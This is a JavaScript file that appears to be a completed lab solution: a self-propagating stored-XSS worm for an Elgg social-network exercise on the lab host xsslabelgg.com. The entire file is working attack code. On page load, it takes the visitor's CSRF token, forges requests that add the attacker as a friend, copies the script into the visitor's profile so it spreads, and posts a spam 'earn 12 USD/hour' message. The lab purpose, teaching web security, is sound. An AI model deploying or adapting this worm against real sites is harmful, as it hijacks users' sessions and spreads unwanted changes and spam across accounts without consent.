<script id = "worm" type="text/javascript">
	window.onload = function () {
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var id = elgg.session.user.guid; // user id	
	

	if ( id != 47){	// skip if the id is Sammy's
		
		//--------------1. Adding Sammy as friend----------------------------------
		
		//actual request url example for adding Sammy as friend, got from the inspect mode of the browser.
		//http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1624467876&__elgg_token=vW7NX1gvAKw9e0YZoJ5Tfw
		
		var sendurl= "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token; //FILL IN

		//Create and send Ajax request to add friend to Sammy
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
		
		
		//---------------2. Copying the worm to the visitor profile-----------------
		var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
		var jsCode = document.getElementById("worm").innerHTML;
		var tailTag = "</" + "script>";
		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	
		//Got the request URL from inspect mode of the browser.		
		var sendurl2="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
	
		var content=token + ts + "&description=" + wormCode +"&guid=" + id; //FILL IN
	
		//Create and send Ajax request to modify visitor profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl2,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);


		//-----------------3. Posting on the wire-----------------------------------
		
		//Got the request URL from inspect mode of the browser.
	        var sendurl3="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
		
		var name = "";
		if (id == 36){
			name = "admin";
		}
		else if(id == 44){
			name = "alice";		
		}
		else if(id == 45){
			name = "boby";		
		}
		else if(id == 46){
			name = "charlie";		
		}
		else{
			name = "samy";		
		}
		var content2=token + ts + "&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2F" + name;

		//actual request body example got from the "Edit and Resend" option.  
		//__elgg_token=wpUu2T2OQWdA_wM3xsfq0w&__elgg_ts=1624532050&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy
		//token + ts + "&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy"

		//Create and send Ajax request to post on the wire.
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl3,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content2);
	}
}
</script>
